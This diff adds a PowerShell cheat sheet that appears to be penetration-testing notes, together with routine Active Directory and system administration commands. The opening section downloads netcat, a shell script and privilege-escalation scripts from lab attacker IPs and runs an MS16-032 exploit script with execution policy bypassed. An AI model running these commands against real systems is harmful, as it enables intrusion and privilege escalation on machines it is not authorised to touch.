@@ -1,0 +1,106 @@
+Powershell   
+-------------------------------------------
+Powershell commands can be seperated with ;
+> powershell -noninteractive
+
+An alternative to Wget:
+> $client = new-object System.Net.WebClient
+> $client.DownloadFile('http://10.11.0.69/nc.exe', 'C:\HFS\nc.exe')
+OR (New-Object System.Net.WebClient).Downloadfile("http://10.11.0.69/nc.exe", "nc.exe")
+OR
+(New-Object System.Net.WebClient).Downloadfile('http://10.10.14.3/shell.ps1', 'shell.ps1')
+
+powershell -noninteractive (New-Object System.Net.WebClient).Downloadfile('http://10.10.14.3/Sherlock.ps1', 'Sherlock.ps1')
+
+powershell -noninteractive -ExecutionPolicy Bypass ./beth.ps1
+powershell -noninteractive -ExecutionPolicy Bypass ./Invoke-MS16032.ps1
+
+$credential = New-Object System.Management.Automation.PsCredential(".administrator", (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force))
+
+If you need to specify credentials to download the file, add the following line in between:
+> $client.Credentials =  Get-Credential     
+
+Get Versions:   
+[environment]::OSVersion.Version  
+$PSVersionTable.PSVersion
+   
+Navigate Registry:    cd HKLM:\
+List all MS Hotfixes:  Get-HotFix
+
+Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run
+
+
+
+Active Directory Commands:
+--------------------------
+import-module <module name>
+import-module activedirectory
+
+get-module -listavailable
+
+Default in WinServer 2008r2
+Import-module servermanager
+add-windowsfeature RSAT-AD-PowerShell
+
+$env:COMPUTERNAME  (Hostname)
+$env:USERDNSDOMAIN  (Domain name)
+
+Knowing the Hostname or User
+>Get-ADComputer -Identity <hostname> -Properties *
+>Get-ADUser -Identity <name> -Properties PasswordLastSet
+
+Search by a property within User/Computer:
+> Get-ADUser -Filter {Surname -like "McDowell"}
+> Get-ADUser -Filter {Name -like "James, Robin"}
+> Get-ADComputer -Filter {DNSHostName -like "hostname.domain.name"} -Property IPV4Address
+ 
+Find Description of a box by their DNSHostName
+> Get-ADComputer -Filter {DNSHostName -like "hostname.domain.name"}  -Property Description 
+
+Find security groups with the name admin in the name:
+> Get-ADObject -filter {name -like "*admin*"} | select-object name 
+
+Find all members of Domain Administrators:
+> Get-ADGroupMember "Domain Admins" -recursive | Select-Object SamAccountName
+ 
+Find security groups associated to a specific username
+>  Get-ADPrincipalGroupMembership rviles0425 | select name
+
+Find all OU’s on a Domain
+>  Get-ADOrganizationalUnit –Filter * | Select-Object Name
+
+Find all Domain Controllers or Specific computers belonging to an OU by Domain
+> Get-ADGroupMember 'Domain Controllers' | Select-Object name
+
+
+List Servers by Operating System:
+Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Enabled -eq "True")} -P
+roperties OperatingSystem, SamAccountName | Sort OperatingSystem | select SamAccountName,OperatingSystem
+
+Domain Admins password last set:
+Get-ADGroupMember -Identity ‘Domain Admins’ | foreach {Get-ADUser -Identity $psitem.samAccountName -Properties PasswordLastSet, PasswordNeverExpires|select Name, PasswordLastSet, PasswordNeverExpires}
+
+
+OS level Commands
+-----------------
+Get-Process
+Get-Service
+
+Get CPU Usage by Process
+> gwmi Win32_PerfFormattedData_PerfProc_Process -filter "Name <> '_Total' and Name <> 'Idle'" -Computer $servername | where { $_.PercentProcessorTime -gt 0 } | select Name, PercentProcessorTime
+
+
+Useful Tool Commands
+--------------------
+Convert string from ascii to Base64:
+> [System.Convert]::ToBase64String([System.text.Encoding]::UTF8.GetBytes("PS FTW!"))  
+  
+Find MAC Address of Computer by IP
+> (gwmi -Class Win32_NetworkAdapterConfiguration | where { $_.IpAddress -eq 10.11.1.1 }).MACAddress
+
+
+
+Find a specific command - This will look for anything in the “$env:path”:
+Get-command *whatever*
+
+ 
